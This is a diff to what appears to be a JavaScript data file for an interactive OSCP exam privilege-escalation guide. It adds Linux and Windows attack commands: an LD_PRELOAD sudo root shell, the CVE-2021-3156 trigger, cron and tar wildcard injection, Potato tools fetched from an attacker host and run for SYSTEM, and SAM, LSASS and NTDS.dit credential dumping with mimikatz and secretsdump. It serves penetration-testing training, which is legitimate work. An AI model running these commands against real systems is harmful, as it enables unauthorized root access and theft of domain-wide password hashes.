+gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
+# Step 2: sudo any allowed binary with LD_PRELOAD pointing to your lib
+sudo LD_PRELOAD=/tmp/shell.so vim    # replace vim with any NOPASSWD binary
+# Result: bash shell as root
+
+# ── SUDO VERSION EXPLOIT ──────────────────
+# Baron Samedit — sudo < 1.9.5p2 (CVE-2021-3156)
+sudo --version
+# If vulnerable:
+# sudoedit -s '\' $(python3 -c 'print("A"*65536)')`,
+    warn: "NOPASSWD entries are the fastest win — no cracking needed. LD_PRELOAD only works when env_keep+=LD_PRELOAD appears in the sudo -l output; without it, sudo strips the environment variable before execution. Always run sudo -l first even if you think you have no sudo rights — NOPASSWD rules on specific binaries are common on OSCP.",
     choices: [
       { label: "GTFOBins worked — ROOT!", next: "got_root_linux" },
       { label: "Nothing useful — check SUID", next: "suid_check" },
@@ -4887,25 +5227,44 @@ strace /path/to/suid_binary                  # syscalls`,
     cmd: `cat /etc/crontab
 ls -la /etc/cron*
 crontab -l
+cat /etc/cron.d/*
 
-# pspy — watch for root processes (no root needed)
+# pspy — watch for root processes you can't see in crontab
 /tmp/pspy64
+# Watch for: UID=0 processes, scripts called from writable paths
 
-# If you find a writable script called by root:
+# ── WRITABLE SCRIPT ───────────────────────
+# If you find a script called by root cron that you can write to:
 echo 'chmod +s /bin/bash' >> /path/to/script.sh
-# Wait for execution, then:
-/bin/bash -p
+# Wait for next execution, then:
+/bin/bash -p   # -p preserves effective UID
 
-# Or add SUID to copy of bash
-echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/script.sh
-
-# PATH injection in cron:
-# If cron calls unqualified binary + you control PATH dir:
+# ── PATH INJECTION IN CRON ────────────────
+# If crontab has PATH= and an early writable dir, or calls unqualified binary:
+# Example: PATH=/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+# And cron runs: curl http://...  (no full path)
 echo '#!/bin/bash' > /tmp/curl
 echo 'chmod +s /bin/bash' >> /tmp/curl
 chmod +x /tmp/curl
-export PATH=/tmp:$PATH`,
-    warn: null,
+# Wait for cron — /tmp/curl runs as root instead of /usr/bin/curl
+
+# ── WILDCARD INJECTION ────────────────────
+# If root cron runs: tar -czf backup.tar.gz /var/www/html/*
+# Or: chown www-data:www-data /uploads/*
+# Wildcard * expands to filenames in the directory — filenames become arguments
+# Exploit tar wildcard:
+cd /var/www/html   # or wherever the wildcard runs
+echo 'chmod +s /bin/bash' > /tmp/privesc.sh
+chmod +x /tmp/privesc.sh
+# Create filenames that become tar arguments:
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh /tmp/privesc.sh'
+# When cron runs tar *, these filenames become: tar --checkpoint=1 --checkpoint-action=exec=sh /tmp/privesc.sh ...
+# Wait for cron, then: /bin/bash -p
+
+# Exploit chown wildcard (same idea — create filenames as flags):
+touch -- '--reference=/tmp/evil'  # chown inherits permissions from reference file`,
+    warn: "Wildcard injection is one of the most reliable but most overlooked cron privesc paths. Any cron job using * in a directory you can write to is potentially vulnerable — tar, chown, rsync, and cp all have exploitable flag options. pspy is essential: many cron jobs run every minute but don't appear in /etc/crontab — they're in /etc/cron.d/, /etc/cron.hourly/, or are user crontabs.",
     choices: [
       { label: "Cron exploitation worked — ROOT!", next: "got_root_linux" },
       { label: "No writable cron targets — try capabilities", next: "linux_manual_enum" },
@@ -5215,25 +5574,51 @@ C:\Windows\Temp\sb.exe TokenGroups TokenPrivileges UAC`,
     title: "Token Impersonation (Potato)",
     body: "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege = instant SYSTEM on almost every Windows version. No Metasploit needed.",
     cmd: `whoami /priv
-# Look for: SeImpersonatePrivilege
-#           SeAssignPrimaryTokenPrivilege
+# ── INSTANT SYSTEM — POTATO FAMILY ──────
+# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
+# Any of these = GodPotato → instant SYSTEM
+
+# GodPotato — most universal (Server 2012-2022, Win 10/11)
+iwr http://$LHOST/GodPotato-NET4.exe -OutFile C:\\Windows\\Temp\\gp.exe
+.\\gp.exe -cmd "cmd /c whoami"
+.\\gp.exe -cmd "C:\\Windows\\Temp\\shell.exe"
 
 # PrintSpoofer — Windows 10 / Server 2016-2019
 iwr http://$LHOST/PrintSpoofer64.exe -OutFile C:\\Windows\\Temp\\ps.exe
 .\\ps.exe -i -c cmd
 .\\ps.exe -c "C:\\Windows\\Temp\\shell.exe"
 
-# GodPotato — most universal (works on Server 2012-2022)
-iwr http://$LHOST/GodPotato-NET4.exe -OutFile C:\\Windows\\Temp\\gp.exe
-.\\gp.exe -cmd "cmd /c whoami"
-.\\gp.exe -cmd "C:\\Windows\\Temp\\shell.exe"
-
 # JuicyPotatoNG — if others fail
-.\\JuicyPotatoNG.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c whoami"`,
-    warn: null,
+.\\JuicyPotatoNG.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c whoami"
+
+# ── SeBackupPrivilege → SAM DUMP ──────────
+# SeBackupPrivilege lets you read ANY file regardless of ACL
+# No potato needed — dump SAM + SYSTEM directly
+
+# Check if you have it:
+whoami /priv | findstr SeBackup
+
+# Method 1 — reg save (simplest):
+reg save HKLM\\SAM C:\\Windows\\Temp\\sam
+reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys
+# Transfer both files to Kali, then:
+impacket-secretsdump -sam sam -system sys LOCAL
+# Crack NTLM hashes or pass-the-hash
+
+# Method 2 — robocopy bypass (copy protected files):
+robocopy /b C:\\Windows\\System32\\config C:\\Windows\\Temp SAM SYSTEM
+impacket-secretsdump -sam C:\\Windows\\Temp\\SAM -system C:\\Windows\\Temp\\SYSTEM LOCAL
+
+# ── SeDebugPrivilege → LSASS DUMP ─────────
+# Allows attaching to LSASS — mimikatz sekurlsa::logonpasswords
+# Check: whoami /priv | findstr SeDebug
+.\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"`,
+    warn: "SeBackupPrivilege is commonly found on backup service accounts, IT support accounts, and IIS app pool accounts — not just admins. It's easy to overlook because it doesn't have 'impersonate' in the name. Pair with impacket-secretsdump for instant hash extraction without needing SYSTEM first.",
     choices: [
       { label: "Potato worked — SYSTEM!", next: "got_root_windows" },
-      { label: "No impersonate privs — check other vectors", next: "winpeas" },
+      { label: "SeBackupPrivilege — dumped SAM hashes", next: "hashcrack" },
+      { label: "SeDebugPrivilege — dumped LSASS creds", next: "creds_found" },
+      { label: "No useful privs — check other vectors", next: "winpeas" },
     ],
   },
 
@@ -5325,13 +5710,32 @@ runas /savecred /user:admin cmd
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 
-# SAM + SYSTEM dump (must be admin)
+# SAM + SYSTEM dump (must be admin — local accounts only)
 reg save HKLM\\SAM C:\\Windows\\Temp\\sam
-reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system
-# Transfer both, then on Kali:
-impacket-secretsdump -sam sam -system system LOCAL
+reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys
+# Transfer both to Kali, then:
+impacket-secretsdump -sam sam -system sys LOCAL
+# Output format: Administrator:500:LM:NTLM:::
+# Use the NTLM field (after second colon) for PtH or cracking
 
-# Mimikatz (manual, no MSF)
+# ── NTDS.DIT — DOMAIN CONTROLLER ONLY ────
+# Contains ALL domain account hashes — DC privesc jackpot
+# Must be SYSTEM or DA on the DC
+
+# Method 1 — secretsdump remote (if you have DA creds):
+impacket-secretsdump $DOMAIN/$USER:'$PASS'@$DC_IP -just-dc-ntlm
+
+# Method 2 — VSS shadow copy (from DC SYSTEM shell):
+# Create shadow copy
+vssadmin create shadow /for=C:
+# Note the shadow copy path (e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1)
+copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\\Windows\\Temp\\ntds.dit
+copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\\Windows\\Temp\\sys
+# Transfer both to Kali:
+impacket-secretsdump -ntds ntds.dit -system sys LOCAL -outputfile domain_hashes
+# Crack or PtH with Administrator hash
+
+# ── MIMIKATZ ──────────────────────────────
 .\\mimikatz.exe "privilege::debug" \\
   "token::elevate" \\
   "sekurlsa::logonpasswords" \\
@@ -5344,7 +5748,7 @@ dir /s /b C:\\Users\\*.xml 2>nul
 dir /s /b C:\\Users\\*.txt 2>nul
 dir /s /b C:\\*pass* 2>nul
 dir /s /b C:\\*.config 2>nul`,
-    warn: null,
+    warn: "secretsdump output format is username:RID:LM:NTLM::: — the NTLM hash is the 4th field. Machine accounts (ending in $) appear in the output — skip them for cracking, focus on user accounts. ntds.dit requires a SYSTEM hive to decrypt — always grab both files together.",
     choices: [
       { label: "Found NTLM hash — Pass the Hash", next: "pth" },
       { label: "Found plaintext creds", next: "creds_found" },
@@ -5704,8 +6108,25 @@ crackmapexec smb $DC_IP -u $USER -p $PASS -M gpp_autologin
 # Or manually:
 smbclient //$DC_IP/SYSVOL -U $DOMAIN/$USER%$PASS
 # find Groups.xml → decrypt cpassword:
-gpp-decrypt 'CPASSWORD_VALUE'`,
-    warn: "Password policy is non-negotiable to check first. A lockout threshold of 3 with a 30-minute window means you get 2 spray attempts per window. Get it wrong and you lock accounts — exam failure. If lockout threshold shows 0 (no lockout), spray freely. description field in LDAP often contains passwords left by admins.",
+gpp-decrypt 'CPASSWORD_VALUE'
+
+# ── STEP 7: BLOODHOUND COLLECTION ─────────
+# CME one-liner — collects everything and zips for BloodHound import:
+crackmapexec smb $DC_IP -u $USER -p $PASS --bloodhound -ns $DC_IP --collection All
+# Output: *.zip in current dir → drag into BloodHound UI
+
+# If DNS fails (common when DC IP ≠ DNS server):
+crackmapexec smb $DC_IP -u $USER -p $PASS --bloodhound -ns $DC_IP --dns-tcp --collection All
+# --dns-tcp forces TCP for DNS resolution (more reliable than UDP on VPN/tunnels)
+
+# Standalone bloodhound-python:
+bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -ns $DC_IP -c All
+bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -ns $DC_IP -c All --dns-tcp
+
+# From Windows foothold (SharpHound):
+.\\SharpHound.exe -c All --zipfilename bh_data.zip
+# Transfer zip to Kali, import into BloodHound`,
+    warn: "Password policy is non-negotiable to check first. A lockout threshold of 3 with a 30-minute window means you get 2 spray attempts per window. Get it wrong and you lock accounts — exam failure. If lockout threshold shows 0 (no lockout), spray freely. --dns-tcp is critical when running over a VPN or tunnel — UDP DNS often fails silently and BloodHound collection returns empty results without any error message.",
     choices: [
       { label: "Run BloodHound (mandatory)", next: "bloodhound" },
       { label: "Responder — passive NTLM hash capture", next: "responder" },
